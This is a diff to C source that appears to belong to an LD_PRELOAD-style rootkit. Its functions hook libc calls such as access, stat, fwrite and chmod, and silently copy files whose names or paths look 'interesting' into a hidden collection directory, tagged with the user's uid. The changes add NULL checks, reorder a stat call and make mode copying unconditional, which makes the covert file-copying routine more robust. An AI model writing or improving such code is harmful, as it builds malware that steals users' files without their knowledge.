@@ -28,6 +28,9 @@ int linkfile(const char *oldpath, char *newpath){
     oldoldpath = fullpath(cwd, oldpath);
     free(cwd);
 
+    if(oldoldpath == NULL)
+        return 1;
+
     int ret = (long)call(CSYMLINK, oldoldpath, newnewpath);
     free(oldoldpath);
     return ret;
@@ -37,6 +40,7 @@ int linkfile(const char *oldpath, char *newpath){
 char *fullpath(char *cwd, const char *file){
     size_t pathlen = strlen(cwd)+strlen(file)+2;
     char *ret = malloc(pathlen);
+    if(!ret) return NULL;
     memset(ret, 0, pathlen);
     snprintf(ret, pathlen, "%s/%s", cwd, file);
     return ret;
@@ -45,6 +49,7 @@ char *fullpath(char *cwd, const char *file){
 int fileincwd(char *cwd, const char *file){
     int incwd=0;
     char *curpath = fullpath(cwd, file);
+    if(curpath == NULL) return 0;
 
     hook(CACCESS);
     if((long)call(CACCESS, curpath, F_OK) == 0)
@@ -116,20 +121,15 @@ int writecopy(const char *oldpath, char *newpath){
 
     hook(CFWRITE, C__XSTAT);
 
+    memset(&nstat, 0, sizeof(struct stat));
+    statr = (long)call(C__XSTAT, _STAT_VER, newpath, &nstat);
+    if(statr < 0 && errno != ENOENT) return 1;
+
     ofp = bindup(oldpath, newpath, &nfp, &fsize, &mode);
     if(ofp == NULL && errno == ENOENT) return 1;
     else if(ofp == NULL) return -1;
 
-    memset(&nstat, 0, sizeof(struct stat));
-    statr = (long)call(C__XSTAT, _STAT_VER, newpath, &nstat);
-
     if(!S_ISREG(mode) || (statr && nstat.st_size == fsize)){
-        fclose(ofp);
-        fclose(nfp);
-        return 1;
-    }
-
-    if(statr < 0 && errno != ENOENT){
         fclose(ofp);
         fclose(nfp);
         return 1;
@@ -153,6 +153,7 @@ int writecopy(const char *oldpath, char *newpath){
     blksize = getablocksize(fsize);
     do{
         buf = malloc(blksize+1);
+        if(!buf) goto nopenope;
         memset(buf, 0, blksize+1);
         n = fread(buf, 1, blksize, ofp);
         if(n){
@@ -162,14 +163,13 @@ int writecopy(const char *oldpath, char *newpath){
         fflush(ofp);
         free(buf);
     }while(n > 0 && n == m);
-
+nopenope:
     fclose(ofp);
     fclose(nfp);
 
 #ifdef KEEP_FILE_MODE
     hook(CCHMOD);
-    if(copystat)
-        call(CCHMOD, newpath, mode);
+    call(CCHMOD, newpath, mode);
 #endif
 
     return 1;
@@ -184,12 +184,12 @@ char *getnewpath(char *filename){
         memmove(filenamedup, filenamedup + 1, strlen(filenamedup));
 
     ret = malloc(path_maxlen);
+    if(!ret) return NULL;
     memset(ret, 0, path_maxlen);
-    snprintf(ret, path_maxlen, "%s/%d-%s",
+    snprintf(ret, path_maxlen, "%s/%u-%s",
                                 INTEREST_DIR,
                                 getuid(),
                                 filenamedup);
-
     free(filenamedup);
     return ret;
 }
@@ -213,8 +213,17 @@ void inspectfile(const char *pathname){
          *filename = basename(dupdup),
          *newpath;
 
+    if(strlen(pathname)<=1 || strlen(filename)<=1){
+        free(dupdup);
+        return;
+    }
+
     if(interesting(pathname) || interesting(filename)){
         newpath = getnewpath(filename);
+        if(newpath == NULL){
+            free(dupdup);
+            return;
+        }
 
 #ifdef BLACKLIST_TOO
         if(!uninteresting(filename))
